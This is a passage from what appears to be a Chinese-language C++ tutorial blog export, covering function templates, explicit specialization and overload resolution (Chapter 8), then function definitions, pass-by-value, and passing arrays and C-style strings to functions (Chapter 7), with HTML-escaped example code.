arr_b[] = &#123;4, 5, 6&#125;; int size = 3; std::cout &lt;&lt; &quot;\\nBefore swapping arrays:&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;arr_a: &quot; &lt;&lt; arr_a[0] &lt;&lt; &quot; &quot; &lt;&lt; arr_a[1] &lt;&lt; &quot; &quot; &lt;&lt; arr_a[2] &lt;&lt; std::endl; std::cout &lt;&lt; &quot;arr_b: &quot; &lt;&lt; arr_b[0] &lt;&lt; &quot; &quot; &lt;&lt; arr_b[1] &lt;&lt; &quot; &quot; &lt;&lt; arr_b[2] &lt;&lt; std::endl; Swap(arr_a, arr_b, size); // 调用版本 2: Swap&lt;int&gt;(int[], int[], int) std::cout &lt;&lt; &quot;\\nAfter swapping arrays:&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;arr_a: &quot; &lt;&lt; arr_a[0] &lt;&lt; &quot; &quot; &lt;&lt; arr_a[1] &lt;&lt; &quot; &quot; &lt;&lt; arr_a[2] &lt;&lt; std::endl; std::cout &lt;&lt; &quot;arr_b: &quot; &lt;&lt; arr_b[0] &lt;&lt; &quot; &quot; &lt;&lt; arr_b[1] &lt;&lt; &quot; &quot; &lt;&lt; arr_b[2] &lt;&lt; std::endl; return 0;&#125; 编译器会根据调用时提供的参数数量和类型（包括是否是数组）来选择最匹配的重载模板。 8.5.2 模板的局限性函数模板是通用的，但并非万能。模板代码中使用的操作（如赋值 =、比较 &lt;、&gt; 等）必须对实例化时使用的具体类型有效。如果某个类型不支持模板代码中的操作，那么实例化该类型的模板就会导致编译错误。 示例：模板可能失败的情况 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;template &lt;typename T&gt;void CompareAndPrint(const T&amp; a, const T&amp; b) &#123; if (a &lt; b) &#123; // 假设类型 T 支持 &lt; 运算符 std::cout &lt;&lt; &quot;a is less than b&quot; &lt;&lt; std::endl; &#125; else if (b &lt; a) &#123; // 假设类型 T 支持 &lt; 运算符 std::cout &lt;&lt; &quot;b is less than a&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;a and b are equal (or incomparable)&quot; &lt;&lt; std::endl; &#125;&#125;struct Data &#123; int val; // 这个结构体没有重载 &lt; 运算符&#125;;int main() &#123; int x = 5, y = 10; CompareAndPrint(x, y); // OK: int 支持 &lt; 运算符 Data d1 = &#123;10&#125;; Data d2 = &#123;20&#125;; // CompareAndPrint(d1, d2); // 编译错误！Data 类型没有定义 operator&lt; // 编译器无法实例化 CompareAndPrint&lt;Data&gt; return 0;&#125; 要解决这个问题，可以为 Data 结构重载 &lt; 运算符，或者使用下一节将介绍的显式具体化。 8.5.3 显式具体化 (Explicit Specialization)有时，通用的函数模板对于某个特定类型可能不适用或效率不高，我们希望为这个特定类型提供一个专门的、非模板的实现。这就是显式具体化。 语法: 1234template &lt;&gt; // 空的尖括号表示这是一个具体化return_type function_name&lt;specific_type&gt;(parameter_list_with_specific_type) &#123; // 针对 specific_type 的特殊实现&#125; template &lt;&gt;: 告诉编译器这是一个显式具体化。 function_name&lt;specific_type&gt;: 在函数名后明确指定要为哪个类型提供具体化版本。 函数体包含针对 specific_type 的特殊代码。 示例：为结构体具体化 Swap 模板 假设我们有一个结构体，我们只想交换其中的某个成员，而不是整个结构体。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include &lt;iostream&gt;struct Job &#123; char name[40]; double salary; int floor;&#125;;// 通用 Swap 模板 (同上)template &lt;typename T&gt;void Swap(T&amp; a, T&amp; b) &#123; std::cout &lt;&lt; &quot;(Using generic Swap)&quot; &lt;&lt; std::endl; T temp = a; a = b; b = temp;&#125;// 针对 Job 类型的显式具体化template &lt;&gt;void Swap&lt;Job&gt;(Job&amp; j1, Job&amp; j2) &#123; // 明确指定 T 为 Job std::cout &lt;&lt; &quot;(Using specialized Swap for Job - swapping salary and floor only)&quot; &lt;&lt; std::endl; // 只交换 salary 和 floor 成员 double temp_salary = j1.salary; j1.salary = j2.salary; j2.salary = temp_salary; int temp_floor = j1.floor; j1.floor = j2.floor; j2.floor = temp_floor; // name 成员保持不变&#125;int main() &#123; int i = 10, j = 20; Swap(i, j); // 调用通用模板 Swap&lt;int&gt; Job sue = &#123;&quot;Susan Yaffee&quot;, 73000.60, 7&#125;; Job sid = &#123;&quot;Sidney Taffee&quot;, 78060.72, 9&#125;; std::cout &lt;&lt; &quot;\\nOriginal Jobs:&quot; &lt;&lt; std::endl; std::cout &lt;&lt; sue.name &lt;&lt; &quot;: $&quot; &lt;&lt; sue.salary &lt;&lt; &quot; on floor &quot; &lt;&lt; sue.floor &lt;&lt; std::endl; std::cout &lt;&lt; sid.name &lt;&lt; &quot;: $&quot; &lt;&lt; sid.salary &lt;&lt; &quot; on floor &quot; &lt;&lt; sid.floor &lt;&lt; std::endl; Swap(sue, sid); // 调用显式具体化版本 Swap&lt;Job&gt; std::cout &lt;&lt; &quot;\\nSwapped Jobs (partially):&quot; &lt;&lt; std::endl; std::cout &lt;&lt; sue.name &lt;&lt; &quot;: $&quot; &lt;&lt; sue.salary &lt;&lt; &quot; on floor &quot; &lt;&lt; sue.floor &lt;&lt; std::endl; std::cout &lt;&lt; sid.name &lt;&lt; &quot;: $&quot; &lt;&lt; sid.salary &lt;&lt; &quot; on floor &quot; &lt;&lt; sid.floor &lt;&lt; std::endl; return 0;&#125; 当编译器遇到 Swap(sue, sid) 调用时，它发现存在一个专门为 Job 类型定义的显式具体化版本 Swap&lt;Job&gt;，于是优先选择并调用这个特殊版本，而不是通用的模板版本。 8.5.4 实例化和具体化 (Instantiation and Specialization)区分这两个概念很重要： 实例化 (Instantiation): 编译器根据函数模板和调用时使用的具体类型自动生成一个特定类型的函数版本。这是模板的基本工作方式。 隐式实例化 (Implicit Instantiation): 编译器在需要时自动进行（如 Swap(i, j)）。 显式实例化 (Explicit Instantiation): 程序员可以指示编译器立即生成特定类型的函数版本，即使还没有调用它。语法：template return_type function_name&lt;specific_type&gt;(parameter_list); (注意末尾的分号)。这在某些高级场景（如将模板定义放在源文件中）可能有用。 12// 在 .cpp 文件中显式实例化 Swap&lt;int&gt;template void Swap&lt;int&gt;(int&amp;, int&amp;); 具体化 (Specialization): 程序员为某个特定类型提供一个完全不同的、非模板的函数定义，以覆盖通用的模板行为。 显式具体化 (Explicit Specialization): 使用 template &lt;&gt; 语法为特定类型提供自定义实现（如上例中的 Swap&lt;Job&gt;）。 8.5.5 编译器选择使用哪个函数版本当存在多个函数（普通函数、函数模板、模板具体化）可能匹配一个函数调用时，编译器遵循一套规则来选择最佳匹配，这个过程称为**重载解析 (Overload Resolution)**。简化规则如下： 寻找完全匹配: 编译器首先查找是否存在一个非模板函数，其参数类型与调用实参完全匹配（或只需进行不重要的转换，如数组名到指针）。 寻找模板匹配: 如果没有找到完全匹配的非模板函数，编译器会尝试查找函数模板。 查找显式具体化: 检查是否存在一个显式具体化版本，其类型与实参完全匹配。 尝试模板实例化: 尝试通过实参推导模板参数，看是否能从通用模板生成一个匹配的实例。 选择最佳匹配: 如果只有一个匹配项（非模板函数、显式具体化或模板实例），则选择该项。 如果存在多个匹配项： 非模板函数优先于模板实例: 如果一个非模板函数和一个模板实例都能匹配，通常优先选择非模板函数。 显式具体化优先于模板实例: 如果一个显式具体化和一个通用模板实例都能匹配，优先选择显式具体化。 更具体的模板优先: 如果有多个模板实例可以匹配（可能涉及类型转换），编译器会尝试找出“最具体”的模板（即需要较少或较不复杂的类型转换就能匹配的模板）。如果无法确定哪个最具体，则调用是**歧义的 (ambiguous)**，会导致编译错误。 示例: 12345678910111213141516171819202122232425#include &lt;iostream&gt;// 1. 非模板函数void Show(int i) &#123; std::cout &lt;&lt; &quot;Non-template Show(int): &quot; &lt;&lt; i &lt;&lt; std::endl; &#125;// 2. 通用函数模板template &lt;typename T&gt;void Show(T t) &#123; std::cout &lt;&lt; &quot;Template Show(T): &quot; &lt;&lt; t &lt;&lt; std::endl; &#125;// 3. 显式具体化template &lt;&gt;void Show&lt;double&gt;(double d) &#123; std::cout &lt;&lt; &quot;Specialized Show&lt;double&gt;: &quot; &lt;&lt; d &lt;&lt; std::endl; &#125;int main() &#123; int a = 10; double b = 3.14; char c = &#x27;X&#x27;; Show(a); // 优先匹配 1 (非模板函数) Show(b); // 优先匹配 3 (显式具体化) Show(c); // 匹配 2 (通用模板实例化 Show&lt;char&gt;) Show&lt;&gt;(a); // 使用 &lt;&gt; 强制编译器只考虑模板版本，匹配 2 (通用模板实例化 Show&lt;int&gt;) return 0;&#125; 8.5.6 模板函数的发展函数模板是 C++ 泛型编程的基础。自 C++11 以来，模板功能得到了进一步增强： auto 返回类型推导: 允许编译器根据 return 语句推导函数模板的返回类型。 可变参数模板 (Variadic Templates): 允许定义接受任意数量、任意类型参数的模板（见 18.6 节）。 别名模板 (using): 可以为模板创建别名。 Lambda 表达式: 可以创建匿名的函数对象，常与模板算法结合使用。 Concepts (C++20): 允许对模板参数施加更明确的约束，提高了编译时错误信息的可读性，并使模板意图更清晰。 函数模板是 C++ 中一个非常强大和灵活的特性，它使得编写高度通用和可重用的代码成为可能。 8.6 总结本章深入探讨了 C++ 函数的更多高级特性，旨在提高代码的效率、灵活性和可重用性。 主要内容回顾： 内联函数 (inline): 一种优化建议，请求编译器将函数代码直接替换到调用点，以减少小型、频繁调用函数的调用开销。 inline 只是建议，编译器可自行决定是否采纳。 通常将内联函数定义放在头文件中。 相比宏，内联函数具有类型安全、行为可预测等优点。 引用变量 (&amp;): 变量的别名，声明时必须初始化，之后不能再引用其他变量。 按引用传递 (type&amp;)：函数参数成为原始实参的别名，允许函数修改原始数据，且避免了大型对象的复制开销。 按常量引用传递 (const type&amp;)：函数参数成为原始实参的常量别名，不能通过引用修改原始数据，但同样避免了复制开销。这是传递大型对象进行只读访问的推荐方式。 引用比指针在语法上更简洁，且通常不涉及空值问题。 默认参数: 允许在函数声明（原型）中为参数指定默认值。 调用函数时，如果省略了带有默认值的参数，则使用默认值。 默认参数必须从参数列表的最右边开始指定。 简化了函数调用，提高了函数的灵活性。 函数重载: 允许在同一作用域内定义多个同名函数，只要它们的参数列表（数量、类型、顺序）不同。 编译器根据调用时的实参来选择匹配的重载版本。 返回类型不能作为区分重载函数的依据。 适用于执行概念上相似但处理不同参数的任务。 函数模板 (template &lt;typename T&gt;): 创建通用的、与类型无关的函数定义。 编译器根据调用时使用的具体类型实例化相应的函数版本。 重载模板: 可以定义多个同名模板，只要它们的参数列表或模板参数列表不同。 显式具体化 (template &lt;&gt;): 为特定类型提供专门的、非模板的实现，以覆盖通用模板的行为。 模板是 C++ 泛型编程的基础，极大地提高了代码的可重用性。 通过掌握这些高级函数特性，可以编写出更高效、更灵活、更易于维护的 C++ 代码。","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"},{"name":"C++","slug":"C","permalink":"http://uniqueland.top/tags/C/"}]},{"title":"Chapter 7 函数——C++的编程模块","slug":"Cpp_tutorial_Chapter_7","date":"2025-04-26T12:03:35.384Z","updated":"2025-04-26T12:01:58.783Z","comments":true,"path":"2025/04/26/Cpp_tutorial_Chapter_7/","link":"","permalink":"http://uniqueland.top/2025/04/26/Cpp_tutorial_Chapter_7/","excerpt":"","text":"7.1 复习函数的基本知识函数是 C++ 程序的基本构建块，它们允许我们将代码组织成可重用的、逻辑独立的单元。使用函数可以使程序更模块化、更易于理解和维护。本节将复习函数的基本概念：定义、原型和调用。 7.1.1 定义函数函数定义 (Function Definition) 包含了函数的实际代码，它说明了函数做什么以及如何做。一个函数定义包括以下几个部分： 返回类型 (Return Type): 函数执行完毕后返回给调用者的值的类型。如果函数不返回任何值，则返回类型为 void。 函数名 (Function Name): 用于调用函数的标识符。命名规则与变量名相同。 参数列表 (Parameter List): 位于函数名后的圆括号 () 中，用于接收传递给函数的值。参数之间用逗号分隔，每个参数都需要指定类型和名称。如果函数不接受任何参数，括号内可以为空或写 void。 函数体 (Function Body): 位于花括号 &#123;&#125; 中，包含实现函数功能的 C++ 语句。 语法: 12345return_type function_name(parameter_list) &#123; // 函数体：包含执行任务的语句 // 如果 return_type 不是 void，则需要 return 语句返回值 return value; // (如果 return_type 不是 void)&#125; 示例：定义一个简单的函数 这个函数不接受参数，也不返回值 (void)，只是打印一条消息。 123456789101112#include &lt;iostream&gt;// 函数定义void print_greeting() &#123; std::cout &lt;&lt; &quot;Hello from the function!&quot; &lt;&lt; std::endl;&#125;int main() &#123; // 调用函数 print_greeting(); return 0;&#125; 示例：定义一个带参数并返回值的函数 这个函数接受两个整数作为参数，并返回它们的和。 12345678910111213141516#include &lt;iostream&gt;// 函数定义int add_numbers(int num1, int num2) &#123; int sum = num1 + num2; return sum; // 返回计算结果&#125;int main() &#123; int a = 5; int b = 3; // 调用函数并将返回值存储在 result 变量中 int result = add_numbers(a, b); std::cout &lt;&lt; &quot;The sum of &quot; &lt;&lt; a &lt;&lt; &quot; and &quot; &lt;&lt; b &lt;&lt; &quot; is: &quot; &lt;&lt; result &lt;&lt; std::endl; // 输出: The sum of 5 and 3 is: 8 return 0;&#125; 7.1.2 函数原型和函数调用函数原型 (Function Prototype) 也称为函数声明 (Function Declaration)，它告诉编译器函数的名称、返回类型以及参数列表（类型和顺序），但不包含函数体。原型通常放在 main() 函数之前或单独的头文件中。 为什么需要原型？ C++ 编译器在处理代码时需要“预先知道”函数的接口（它接受什么参数，返回什么类型），然后才能正确地处理对该函数的调用。如果函数定义出现在调用它的代码之后，编译器在遇到调用时就不知道该函数是否存在或如何调用它，从而导致编译错误。函数原型解决了这个问题。 语法: 1return_type function_name(parameter_type_list); // 注意末尾的分号 参数名称在原型中是可选的，但写上通常能提高可读性。 函数调用 (Function Call) 是指在程序中执行一个函数。通过使用函数名，并在括号中提供所需的实际参数（称为**实参 (Arguments)**）来完成调用。 语法: 1234567// 对于不返回值的函数function_name(argument_list);// 对于返回值的函数variable = function_name(argument_list);// 或者直接在表达式中使用// std::cout &lt;&lt; function_name(argument_list); 示例：使用函数原型 123456789101112131415161718192021222324252627#include &lt;iostream&gt;// 函数原型 (声明)void display_message(const char* msg); // 声明函数接口int multiply(int x, int y); // 声明函数接口int main() &#123; // 函数调用 display_message(&quot;This is a message.&quot;); int num1 = 6; int num2 = 7; int product = multiply(num1, num2); // 调用函数 std::cout &lt;&lt; &quot;The product of &quot; &lt;&lt; num1 &lt;&lt; &quot; and &quot; &lt;&lt; num2 &lt;&lt; &quot; is: &quot; &lt;&lt; product &lt;&lt; std::endl; // 输出: 42 return 0;&#125;// 函数定义 (实现) - 可以放在 main 之后，因为原型已经提供了信息void display_message(const char* msg) &#123; std::cout &lt;&lt; msg &lt;&lt; std::endl;&#125;// 函数定义 (实现)int multiply(int x, int y) &#123; return x * y;&#125; 总结: 函数定义: 提供了函数的完整实现（代码）。 函数原型: 声明了函数的接口（名称、返回类型、参数类型），让编译器知道如何调用它，通常放在调用之前。 函数调用: 通过函数名和实参来执行函数定义的代码。 函数是构建结构化和可维护 C++ 程序的核心工具。 7.2 函数参数和按值传递函数参数是函数与调用它的代码之间传递信息的桥梁。当调用函数时，我们提供的值（实参）会被传递给函数定义中声明的变量（形参）。C++ 默认的参数传递方式是**按值传递 (Pass by Value)**。 形参 (Parameters): 在函数定义或函数原型中声明的变量，它们是函数内部使用的局部变量，用于接收调用时传入的值。 实参 (Arguments): 在函数调用时传递给函数的具体值或变量。 按值传递 (Pass by Value): 当使用按值传递时，函数会创建每个形参的副本。调用函数时提供的实参的值会被复制到这些新的形参变量中。函数内部对形参所做的任何修改都只影响这个副本，不会影响到函数调用中使用的原始实参。 示例：演示按值传递 12345678910111213141516171819202122#include &lt;iostream&gt;// 函数定义：接受一个 int 参数 (形参 n)// 按值传递，n 是 value 的副本void modify_value(int n) &#123; std::cout &lt;&lt; &quot;Inside function (before modification): n = &quot; &lt;&lt; n &lt;&lt; std::endl; n = n * 2; // 修改形参 n 的值 std::cout &lt;&lt; &quot;Inside function (after modification): n = &quot; &lt;&lt; n &lt;&lt; std::endl;&#125;int main() &#123; int value = 10; // 实参 std::cout &lt;&lt; &quot;Before calling function: value = &quot; &lt;&lt; value &lt;&lt; std::endl; // 调用函数，将 value 的值传递给形参 n modify_value(value); std::cout &lt;&lt; &quot;After calling function: value = &quot; &lt;&lt; value &lt;&lt; std::endl; // value 的值并未改变 return 0;&#125; 输出: 1234Before calling function: value &#x3D; 10Inside function (before modification): n &#x3D; 10Inside function (after modification): n &#x3D; 20After calling function: value &#x3D; 10 代码解释: main 函数中的变量 value 初始化为 10。 调用 modify_value(value) 时，value 的值 (10) 被复制给了 modify_value 函数的形参 n。 在 modify_value 函数内部，n 的值被修改为 20。但这仅仅修改了 n 这个局部副本。 当函数执行完毕返回 main 后，main 函数中的原始变量 value 仍然是 10，没有受到函数内部修改的影响。 优点: 安全性: 保护了原始数据不被函数意外修改。 缺点: 效率: 对于大型数据结构（如复杂的类对象或结构体），复制整个对象可能消耗较多的时间和内存。在这种情况下，后续章节将介绍的按引用传递或按指针传递可能更高效。 7.2.1 多个参数函数可以接受任意数量的参数。在函数定义和原型中，参数之间用逗号 , 分隔。调用函数时，提供的实参也必须用逗号分隔，并且数量、类型和顺序应与形参列表匹配。 示例：接受多个参数的函数 12345678910111213141516171819#include &lt;iostream&gt;// 函数原型：接受两个 double 和一个 charvoid display_data(double length, double width, char unit) &#123; std::cout &lt;&lt; &quot;Length: &quot; &lt;&lt; length &lt;&lt; &quot; &quot; &lt;&lt; unit &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Width: &quot; &lt;&lt; width &lt;&lt; &quot; &quot; &lt;&lt; unit &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Area: &quot; &lt;&lt; length * width &lt;&lt; &quot; sq &quot; &lt;&lt; unit &lt;&lt; std::endl;&#125;int main() &#123; double len = 5.5; double wid = 2.0; char symbol = &#x27;m&#x27;; // 调用函数，传递三个实参 display_data(len, wid, symbol); return 0;&#125; 输出: 123Length: 5.5 mWidth: 2 mArea: 11 sq m 7.2.2 另外一个接受两个参数的函数下面是另一个简单的例子，计算并返回两个整数中的较大值。 123456789101112131415161718192021222324252627#include &lt;iostream&gt;// 函数定义：接受两个 int 参数，返回较大的那个 intint max(int a, int b) &#123; if (a &gt; b) &#123; return a; &#125; else &#123; return b; &#125; // 或者使用三元运算符: return (a &gt; b) ? a : b;&#125;int main() &#123; int num1 = 15; int num2 = 28; // 调用函数，传递两个实参 int larger_value = max(num1, num2); std::cout &lt;&lt; &quot;Between &quot; &lt;&lt; num1 &lt;&lt; &quot; and &quot; &lt;&lt; num2 &lt;&lt; &quot;, the larger value is: &quot; &lt;&lt; larger_value &lt;&lt; std::endl; // 输出: 28 // 也可以直接在输出语句中调用 std::cout &lt;&lt; &quot;The max of 100 and 99 is: &quot; &lt;&lt; max(100, 99) &lt;&lt; std::endl; // 输出: 100 return 0;&#125; 这个例子再次展示了如何定义和调用带有多个参数的函数，并且该函数还返回一个值。参数 a 和 b 也是按值传递的。 7.3 函数和数组将数组传递给函数是 C++ 中常见的操作，但其工作方式与传递普通变量（如 int 或 double）有显著不同。理解这种差异对于正确使用数组作为函数参数至关重要。 与基本类型默认使用“按值传递”（创建副本）不同，当将数组传递给函数时，C++ 不会复制整个数组。相反，它传递的是数组第一个元素的内存地址。这意味着函数实际上接收的是一个指向数组起始位置的指针。 7.3.1 函数如何使用指针来处理数组因为函数接收的是数组的地址（指针），所以它可以通过这个地址直接访问和修改原始数组的内容。这与按值传递完全不同，后者操作的是副本。 在函数定义中，接收数组参数有几种等效的语法： 12345678// 语法 1: 使用指针表示法void process_array(int* arr, int size);// 语法 2: 使用带空括号的数组表示法void process_array(int arr[], int size);// 语法 3: 使用带指定大小的数组表示法 (大小会被忽略，不推荐)// void process_array(int arr[10], int size); // 这里的 10 实际上没有作用 这三种语法在函数参数列表中是等效的，它们都告诉编译器 arr 是一个指向 int 的指针。最常用的是语法 1 和语法 2。 关键点: 无论使用哪种语法，函数都不知道数组的实际大小。因此，通常需要将数组的大小作为单独的参数传递给函数。 示例：函数修改数组元素 12345678910111213141516171819202122232425262728293031#include &lt;iostream&gt;// 函数原型：接收一个 int 指针 (数组) 和大小void double_elements(int arr[], int size) &#123; // 或者 int* arr std::cout &lt;&lt; &quot;Inside function: Modifying array elements...&quot; &lt;&lt; std::endl; for (int i = 0; i &lt; size; ++i) &#123; arr[i] *= 2; // 直接修改原始数组的元素 &#125;&#125;int main() &#123; int my_array[] = &#123;1, 2, 3, 4, 5&#125;; int array_size = sizeof(my_array) / sizeof(my_array[0]); // 计算数组大小 std::cout &lt;&lt; &quot;Before calling function: &quot;; for (int i = 0; i &lt; array_size; ++i) &#123; std::cout &lt;&lt; my_array[i] &lt;&lt; &quot; &quot;; &#125; std::cout &lt;&lt; std::endl; // 调用函数，传递数组名 (即地址) 和大小 double_elements(my_array, array_size); std::cout &lt;&lt; &quot;After calling function: &quot;; for (int i = 0; i &lt; array_size; ++i) &#123; std::cout &lt;&lt; my_array[i] &lt;&lt; &quot; &quot;; // 数组内容已被修改 &#125; std::cout &lt;&lt; std::endl; return 0;&#125; 输出: 123Before calling function: 1 2 3 4 5Inside function: Modifying array elements...After calling function: 2 4 6 8 10 代码解释: main 函数定义了一个数组 my_array。 调用 double_elements(my_array, array_size) 时，my_array (代表数组首元素的地址) 被传递给函数的 arr 参数，array_size 被传递给 size 参数。 函数内部通过指针 arr 访问并修改了 main 函数中定义的 my_array 的元素。 函数返回后，main 函数中的 my_array 的内容确实发生了改变。 7.3.2 将数组作为参数意味着什么将数组名传递给函数时，会发生所谓的“数组退化”（Array Decay）。数组名会“退化”成指向其第一个元素的指针。这就是为什么函数参数 int arr[] 和 int* arr 是等价的。 Implications: 效率: 不需要复制整个数组，传递地址非常快，尤其是对于大数组。 修改能力: 函数可以直接修改调用者提供的原始数组。这既是优点（允许函数“返回”修改后的数组）也是缺点（可能意外修改数据）。 丢失大小信息: 函数本身无法知道数组的大小。必须显式传递大小信息。 7.3.3 更多数组函数示例示例 1: 计算数组元素总和 123456789101112131415161718#include &lt;iostream&gt;// 函数：计算数组元素的总和int sum_array(const int arr[], int size) &#123; // 使用 const 防止意外修改 int total = 0; for (int i = 0; i &lt; size; ++i) &#123; total += arr[i]; &#125; return total;&#125;int main() &#123; int data[] = &#123;10, 20, 30, 40&#125;; int size = sizeof(data) / sizeof(data[0]); int sum = sum_array(data, size); std::cout &lt;&lt; &quot;Sum of array elements: &quot; &lt;&lt; sum &lt;&lt; std::endl; // 输出: 100 return 0;&#125; 示例 2: 查找数组中的最大值 12345678910111213141516171819202122232425#include &lt;iostream&gt;#include &lt;limits&gt; // 为了使用 INT_MIN// 函数：查找数组中的最大值int find_max(const int* arr, int size) &#123; // 使用指针表示法和 const if (size &lt;= 0) &#123; std::cerr &lt;&lt; &quot;Error: Array size must be positive.&quot; &lt;&lt; std::endl; return std::numeric_limits&lt;int&gt;::min(); // 返回可能的最小值作为错误指示 &#125; int max_val = arr[0]; for (int i = 1; i &lt; size; ++i) &#123; if (arr[i] &gt; max_val) &#123; max_val = arr[i]; &#125; &#125; return max_val;&#125;int main() &#123; int scores[] = &#123;88, 95, 72, 100, 91&#125;; int count = sizeof(scores) / sizeof(scores[0]); int highest_score = find_max(scores, count); std::cout &lt;&lt; &quot;Highest score: &quot; &lt;&lt; highest_score &lt;&lt; std::endl; // 输出: 100 return 0;&#125; 7.3.4 使用数组区间的函数除了传递数组首地址和大小之外，另一种常见且更灵活的方法是传递指向数组开始和结束之后位置的指针（或迭代器，STL 中常用）。这定义了一个处理范围 [begin, end)（包含 begin，不包含 end）。 示例：使用指针区间求和 1234567891011121314151617181920212223242526#include &lt;iostream&gt;// 函数：计算从 begin 到 end (不含 end) 的元素和int sum_range(const int* begin, const int* end) &#123; int total = 0; // 循环直到当前指针达到 end 指针 for (const int* ptr = begin; ptr != end; ++ptr) &#123; total += *ptr; // 解引用指针获取元素值 &#125; return total;&#125;int main() &#123; int data[] = &#123;1, 2, 3, 4, 5, 6, 7, 8, 9, 10&#125;; int size = sizeof(data) / sizeof(data[0]); // 计算整个数组的和 int total_sum = sum_range(data, data + size); // data + size 指向数组末尾之后的位置 std::cout &lt;&lt; &quot;Total sum: &quot; &lt;&lt; total_sum &lt;&lt; std::endl; // 输出: 55 // 计算数组一部分的和 (例如，索引 2 到 6，即元素 3, 4, 5, 6, 7) int partial_sum = sum_range(data + 2, data + 7); // data+2 指向第3个元素, data+7 指向第8个元素 (区间终点) std::cout &lt;&lt; &quot;Partial sum (index 2 to 6): &quot; &lt;&lt; partial_sum &lt;&lt; std::endl; // 输出: 25 return 0;&#125; 这种方法在 C++ 标准库算法中非常常用。 7.3.5 指针和 const如前面的示例所示，如果函数不应该修改传入的数组，应该在函数参数中使用 const 关键字。这是一种重要的编程实践，可以提高代码的安全性和清晰度。 123456789// 这个函数承诺不会修改 arr 指向的数组内容void print_array(const int arr[], int size) &#123; std::cout &lt;&lt; &quot;Array elements: &quot;; for (int i = 0; i &lt; size; ++i) &#123; // arr[i] = 0; // 错误！编译器会阻止修改 const 数据 std::cout &lt;&lt; arr[i] &lt;&lt; &quot; &quot;; &#125; std::cout &lt;&lt; std::endl;&#125; 使用 const 有两个主要好处： 防止意外修改: 编译器会检查并阻止函数内部对 const 参数的修改尝试。 表明意图: 向函数的调用者表明该函数不会改变传入的数组，使得函数接口更清晰。 接受更广泛的参数: const 参数的函数可以接受 const 数组和非 const 数组作为实参，而非 const 参数的函数只能接受非 const 数组。 总结来说，将数组传递给函数是通过传递指向其首元素的指针来实现的。这使得函数能够访问和（如果未使用 const）修改原始数组，但也要求调用者通常需要额外传递数组的大小或使用指针区间来界定操作范围。 7.4 函数和二维数组将二维数组传递给函数比传递一维数组稍微复杂一些。与一维数组类似，二维数组名在传递时也会“退化”成指向其第一个元素的指针。但二维数组的第一个元素本身是一个一维数组。因此，传递的是指向一维数组的指针。 为了让函数能够正确地计算元素在内存中的位置，编译器需要知道除第一维（行数）之外的所有其他维度的大小（列数，以及更高维度的相应大小）。 关键点: 在函数参数中声明二维数组时，必须指定除第一维之外的所有维度的大小。第一维的大小是可选的（通常省略）。 语法: 假设有一个二维数组 int data[3][4]; 函数原型或定义可以这样写： 123456789// 语法 1: 指定列数void process_2d_array(int arr[][4], int rows); // 必须指定列数 4// 语法 2: 使用指向数组的指针 (更精确地反映底层机制)// arr 是一个指针，指向一个包含 4 个 int 的数组void process_2d_array(int (*arr)[4], int rows);// 语法 3: 可以包含第一维，但通常省略// void process_2d_array(int arr[3][4], int rows); // 这里的 3 实际上会被忽略 为什么必须指定列数？ 考虑二维数组 arr[rows][cols] 在内存中是线性存储的。要访问元素 arr[i][j]，编译器需要计算其内存地址，公式通常类似于：基地址 + (i * cols + j) * sizeof(元素类型)。可以看到，计算地址需要知道 cols（列数）的值。如果函数不知道列数，就无法正确地进行指针运算来定位元素。 示例：处理二维数组的函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;iostream&gt;const int COLS = 4; // 使用常量定义列数，方便维护// 函数原型：计算二维数组所有元素的和// 参数：二维数组 (必须指定列数 COLS)，行数int sum_2d_array(int arr[][COLS], int rows);// 函数原型：打印二维数组void print_2d_array(const int arr[][COLS], int rows); // 使用 const 防止修改int main() &#123; int data[3][COLS] = &#123; &#123;1, 2, 3, 4&#125;, &#123;5, 6, 7, 8&#125;, &#123;9, 10, 11, 12&#125; &#125;; int num_rows = 3; std::cout &lt;&lt; &quot;Original 2D Array:&quot; &lt;&lt; std::endl; print_2d_array(data, num_rows); int total_sum = sum_2d_array(data, num_rows); std::cout &lt;&lt; &quot;\\nSum of all elements: &quot; &lt;&lt; total_sum &lt;&lt; std::endl; // 输出: 78 return 0;&#125;// 函数定义：计算二维数组所有元素的和int sum_2d_array(int arr[][COLS], int rows) &#123; int sum = 0; for (int i = 0; i &lt; rows; ++i) &#123; for (int j = 0; j &lt; COLS; ++j) &#123; sum += arr[i][j]; &#125; &#125; return sum;&#125;// 函数定义：打印二维数组void print_2d_array(const int arr[][COLS], int rows) &#123; for (int i = 0; i &lt; rows; ++i) &#123; for (int j = 0; j &lt; COLS; ++j) &#123; std::cout &lt;&lt; arr[i][j] &lt;&lt; &quot;\\t&quot;; // 使用制表符分隔 &#125; std::cout &lt;&lt; std::endl; // 每行结束后换行 &#125;&#125; 代码解释: 我们定义了一个全局常量 COLS 来表示数组的列数。这使得在函数原型和定义中指定列数更加方便和一致。 sum_2d_array 和 print_2d_array 函数的第一个参数都声明为 int arr[][COLS] 或 const int arr[][COLS]，明确指定了列的大小。 main 函数中定义了一个 3x4 的二维数组 data。 调用函数时，传递数组名 data（它代表指向第一个包含 COLS 个 int 的一维数组的指针）和行数 num_rows。 函数内部可以使用标准的 arr[i][j] 语法来访问数组元素，因为编译器知道列数 COLS，可以正确计算每个元素的地址。 总结: 将二维（或更高维）数组传递给函数时，必须在函数参数中指定除第一维之外的所有维度的大小。 这是因为函数需要这些维度信息来进行正确的指针运算以访问数组元素。 通常将数组维度（尤其是除第一维外的维度）定义为常量，以提高代码的可读性和可维护性。 与一维数组一样，函数操作的是原始数组，而不是副本（除非使用了 const，否则函数可以修改原始数组）。 7.5 函数和 C-风格字符串C-风格字符串本质上是字符数组 (char[])，其末尾有一个特殊的空字符 (\\0) 来标记字符串的结束。因此，将 C-风格字符串传递给函数遵循与传递普通数组相同的规则：传递的是指向字符串第一个字符的指针 (char*)。 函数不需要单独的参数来指定字符串的长度，因为它可以遍历字符序列直到遇到空字符 \\0 来确定字符串的结束。 7.5.1 将 C-风格字符串作为参数的函数当函数接收 C-风格字符串作为参数时，通常使用 char* 或 const char* 类型。如果函数不打算修改字符串内容，强烈建议使用 const 